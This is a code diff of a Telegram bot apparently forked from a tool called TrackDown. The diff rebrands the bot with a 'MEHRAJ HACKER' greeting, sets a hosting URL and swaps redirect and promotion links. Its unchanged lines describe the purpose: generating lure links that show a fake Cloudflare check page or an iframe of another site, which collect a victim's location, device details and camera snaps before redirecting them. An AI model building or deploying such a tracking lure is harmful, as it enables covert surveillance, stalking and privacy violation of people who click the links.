@@ -14,7 +14,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="YOUR URL";
+var hostURL="https://TrackDown-2.mdhacker.repl.co";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://wa.me/qr/V3EMUZ6RQSPUM1");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://wa.me/qr/V3EMUZ6RQSPUM1");
 }
 
          
@@ -71,7 +71,7 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome MEHRAJ HACKER${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
@@ -84,7 +84,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
+\n\nThe project is OSS at: https://github.com/mdmehraj6303
 `);
 }
   
@@ -124,8 +124,8 @@ var wUrl=`${hostURL}/w/${url}`;
   
 bot.sendChatAction(cid,"typing");
 if(use1pt){
-var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.1pt.co/proxy?url="+cUrl)}`).then(res => res.json());
-var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.1pt.co/proxy?url="+wUrl)}`).then(res => res.json());
+var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
+var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
 
 var f="",g="";
 
@@ -137,7 +137,7 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n😂Shorten URL 😂 https://sprl.in/mehraj6303 \n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
